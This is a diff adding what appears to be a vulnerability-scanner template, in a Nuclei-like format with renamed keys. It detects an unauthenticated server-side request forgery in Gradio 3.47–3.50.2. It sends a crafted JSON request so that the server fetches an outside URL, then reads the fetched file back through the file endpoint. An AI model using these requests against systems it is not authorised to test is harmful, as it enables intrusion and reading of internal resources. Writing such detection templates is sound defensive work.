@@ -1,0 +1,50 @@
+id: gradio-ssrf
+brief:
+    title: Gradio 3.47 - 3.50.2 - Server-Side Request Forgery
+    by: nvn1729
+    level: high
+    about: Gradio Full Read SSRF when auth is not enabled, this version should work for versions 3.47 - 3.50.2.
+    label:
+        - cve
+        - cve2024
+        - unauth
+        - gradio
+        - ssrf
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/component_server'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/component_server'
+      head:
+        Content-Type: application/json
+      body: '{"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}'
+      signs:
+        - "on": word
+          has:
+            - <h1> Interactsh Server </h1>
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/file={{download_path}}'
+      signs:
+        - "on": word
+          has:
+            - <h1> Interactsh Server </h1>
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
